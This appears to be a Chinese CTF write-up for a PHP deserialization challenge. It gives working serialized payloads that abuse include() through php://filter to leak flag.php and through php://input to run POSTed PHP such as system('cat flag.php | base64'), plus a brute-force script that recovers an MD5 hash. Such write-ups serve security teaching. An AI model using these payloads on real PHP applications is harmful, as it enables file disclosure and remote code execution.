# 解题方法

源码：

```php
<?php

show_source(__file__);

class loadfile{
    public $file = "fakeflag.php";   //flag is in flag.php
    public function __destruct() {
        include($this->file);
        }
}

$fuck = $_GET['fuck'];
$you = unserialize($fuck);
?>
```

反序列化漏洞，这里提示文件在`flag.php`中，所以将文件名改成`flag.php`即可：

```php
<?php
class loadfile{
    public $file = "php://filter/read=convert.base64-encode/resource=flag.php";   //flag is in flag.php
    public function __destruct() {
        include($this->file);
        }
}
echo serialize(new loadfile());
?>
```

执行结果：`O:8:"loadfile":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`

于是构造：` http://121.36.60.224/?fuck=O:8:"loadfile":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`

![](https://files.catbox.moe/de5vfq.png)

将这里的base64解码一下，得到：

```
<?php
if (is_numeric($_GET['flag']) && strlen($_GET['flag']) === 7){
	if(md5($_GET['flag']) === "84402604c73b70e552b4a109f656a4be"){  //爆破flag哦
		echo "this is the true flag"."<br>";
		echo("flag{".$_GET['flag']."}");
	  }
	else{
		echo("You found me, can you get the flag ???");
	  }
}
?>
```

根据第二行代码提示，需要上传一个7位数字，md5值是`84402604c73b70e552b4a109f656a4be`

写代码爆破：

```
from hashlib import md5
import time
t = time.time()

for i in range(1000000,10000000):
    md = md5(str(i).encode('gb2312')).hexdigest()
    if md == '84402604c73b70e552b4a109f656a4be':
        print('md5:',md)
        print("flag: flag{"+str(i)+"}")
        print("time:",time.time()-t)
```

爆破出来flag是`1919810`，

![](https://files.catbox.moe/t21fkm.png)

最终flag：` flag{1919810} `



# 解法二



在反序列化的时候，如果不采用`php://filter`伪协议读取`flag.php`文件，可以使用`php://input`伪协议执行命令。构造：

```php
<?php
class loadfile{
    public $file = "php://input";   //flag is in flag.php
    public function __destruct() {
        include($this->file);
        }
}
echo serialize(new loadfile());
?>
```

得到：`O:8:"loadfile":1:{s:4:"file";s:11:"php://input";}`

构造：`http://121.36.60.224/?fuck=O:8:%22loadfile%22:1:{s:4:%22file%22;s:11:%22php://input%22;}` 同时POST上传 `<?php phpinfo();?>`

![](https://files.catbox.moe/qpmzqi.png)

根据提示查看`flag.php`源码：

构造POST：`<?php system('cat flag.php | base64');?>`

![](https://files.catbox.moe/d5zeuh.png)

接下来的步骤跟法一一样







